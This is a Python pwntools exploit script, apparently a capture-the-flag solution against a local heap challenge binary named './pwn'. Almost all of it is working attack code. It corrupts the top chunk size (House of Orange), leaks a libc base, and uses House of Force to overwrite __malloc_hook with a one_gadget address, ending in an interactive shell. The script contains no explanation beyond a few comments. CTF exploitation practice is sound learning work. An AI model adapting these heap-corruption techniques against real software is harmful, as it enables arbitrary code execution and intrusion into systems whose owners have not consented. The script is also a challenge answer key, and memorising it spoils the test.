#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./pwn')

def push(size, payload):
  p.sendlineafter('>>', str(1))
  p.sendlineafter('size?', str(size))
  p.sendafter('content?', payload)
  p.recvuntil('0x')
  addr = eval('0x' + p.recvuntil('.')[:-1])
  return addr


def puuuuuush(size, payload):
  p.sendlineafter('>>', str(2))
  p.sendlineafter('size?', str(size))
  p.sendafter('content?', payload)

def pop():
  p.sendlineafter('>>', str(3))

def show():
  p.sendlineafter('>>', str(4))

 
if __name__ == "__main__":
  # house of orange : change TopChunk size to -1
  push(0x1400 - 0x10, 'a' * (0x400 - 0x10) + p64(0) + p64(0x9b1))
  push(0xff0, 'mech0n\n')
  push(0x980, 'a')
  show()
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) -   0x3ebc61
  malloc_hook = libc + 0x00000000003ebc30
  # distance = malloc_hook - 
  success('LIBC: ' + str(hex(libc)))

  addr = push(0x1010, 'a' * 0x10 + p64(0) + '\xff' * 8) + 0x10
  success('ADDR: ' + str(hex(addr))) 

  # House of Force : get chunk to __malloc_hook
  dis = malloc_hook - addr - 0x20
  puuuuuush(dis, 'mech0n\n')
  og = [0x4f2c5, 0x4f322, 0x10a38c]
  push(0x10, p64(libc + og[2]))
  
  p.sendlineafter('>>', str(1))
  p.sendlineafter('size?', str(0x30))
  p.interactive()